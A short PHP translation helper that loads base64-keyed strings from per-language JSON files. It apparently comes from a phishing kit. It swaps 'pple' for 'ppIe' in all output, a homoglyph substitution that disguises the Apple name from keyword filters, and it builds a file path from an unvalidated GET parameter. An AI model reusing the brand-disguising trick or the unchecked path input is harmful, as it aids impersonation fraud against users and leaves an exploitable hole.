<?php
error_reporting(E_ERROR);
session_start();
header('Content-Type: text/html; charset=utf-8');

if(empty($_SESSION['bahasa']) || $_SESSION['bahasa'] == "") {
    $lang = $_GET['en'];
}else{
    $lang = $_SESSION['bahasa'];
}

if(!function_exists('tr')) {
    function tr($text) {
        global $lang;
        $path = dirname(__FILE__)."/lang/".strtoupper($lang).".json";

        $zData = array();
        if (file_exists($path)) {
            $zData = json_decode(file_get_contents($path), true);
        }else{
            return $text;
        }

        if (isset($zData[base64_encode($text)])) {
            return str_replace('pple', 'ppIe', base64_decode($zData[base64_encode($text)]));
        }else{
            return $text;
        }
        
    }
}
?>
